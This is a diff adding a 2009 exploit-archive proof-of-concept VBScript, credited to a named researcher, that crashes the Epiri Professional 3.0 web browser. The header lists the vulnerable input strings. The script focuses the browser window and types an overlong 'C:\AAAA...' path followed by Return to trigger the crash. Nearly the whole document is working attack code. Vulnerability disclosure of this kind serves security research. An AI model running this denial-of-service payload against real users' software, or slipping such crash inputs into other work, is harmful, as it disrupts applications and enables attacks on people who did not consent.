@@ -1,0 +1,47 @@
+' Title: Epiri Professional Web Browser 3.0 Remote Crash Exploit
+
+' Vendor: Horizon
+' Product Web Page: http://www.horizonum.com/
+' Current Version: 3.0.0.00
+' Notiz: Microsoft Silverlight
+' Vulnerable Mode: Browse Internet
+' Tested On Microsoft Windows XP Professional SP3 (En)
+
+' Vulnerable strings:
+
+' file://
+' C::
+' C:\AAAA...AAAA [257]
+'
+
+' Vulnerability Discovered By Gjoko 'LiquidWorm' Krstic
+' liquidworm gmail com
+' http://www.zeroscience.org/
+' 28.07.2009
+
+
+' Working PoC: http://zeroscience.org/codes/epiri_crash.vbs
+
+Dim crash
+
+Set crash = CreateObject("WScript.Shell")
+
+With crash
+
+Do Until Success = True
+
+Success = crash.AppActivate("Epiri Professional 3.0")
+
+Loop
+
+'.SendKeys "file://"
+'.SendKeys "C::"
+.SendKeys "C:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+.SendKeys "~" 'Return
+
+End With
+
+Wscript.Quit
+
+# milw0rm.com [2009-07-30]
